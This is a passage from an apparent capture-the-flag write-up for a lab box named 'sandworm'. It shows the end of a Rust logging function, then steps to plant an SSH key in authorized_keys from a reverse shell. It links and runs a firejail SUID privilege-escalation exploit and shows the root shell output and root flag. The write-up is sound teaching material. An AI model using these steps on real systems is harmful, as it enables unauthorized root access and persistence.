    let timestamp = now.format("%Y-%m-%d %H:%M:%S").to_string();
    let log_message = format!("[{}] - User: {}, Query: {}, Justification: {}\n", timestamp, user, query, justification);

    let mut file = match OpenOptions::new().append(true).create(true).open("/opt/tipnet/access.log") {
        Ok(file) => file,
        Err(e) => {
            println!("Error opening log file: {}", e);
            return;
        }
    };

    if let Err(e) = file.write_all(log_message.as_bytes()) {
        println!("Error writing to log file: {}", e);
    }
}
```
</details>
</details>

<details>
<summary>Escape to Root</summary>

Now that we are free from the firejail, let's establish our ssh keys so we can ssh right into the box and have a comfy shell. 

On the attacking machine run this command and copy the output:
```bash
cat ~/.ssh/id_rsa.pub 
ssh-rsa *key removed*
```
In the unjailed atlas reverse shell, use echo and paste the ssh public key in, then redirect it to ~/.ssh/authorized_keys
```bash
echo '<public.key>' > ~/.ssh/authorized_keys
```
From your attacking machine terminal now ssh in as atlas.
```bash
ssh atlas@ssa.htb
```
Now we can kill off our unjailed reverse shell and use the same terminal to ssh in as atlas a second time, as two sessions will be necessary to attempt the firejail exploit mentioned earlier in this write-up.  
For reference, `suid bit priv esc` [exploit](https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25)

Now that we have ssh sessions we can paste the exploit code in on one window, chmod +x the python script, and then run it with python3.

```bash
python3 exploit.py 
You can now run 'firejail --join=42528' in another terminal to obtain a shell where 'sudo su -' should grant you a root shell.
```
In our second ssh session, or in the reverse shell if you decided to keep it:
```bash
atlas@sandworm:~$ firejail --join=42528
changing root to /proc/42528/root
Warning: cleaning all supplementary groups
Child process initialized in 8.53 ms
atlas@sandworm:~$ su -
root@sandworm:~# id
uid=0(root) gid=0(root) groups=0(root)
root@sandworm:~# cat /root/root.txt
2dbafb85127071bfeae30e4f56b47a37
```
</details>
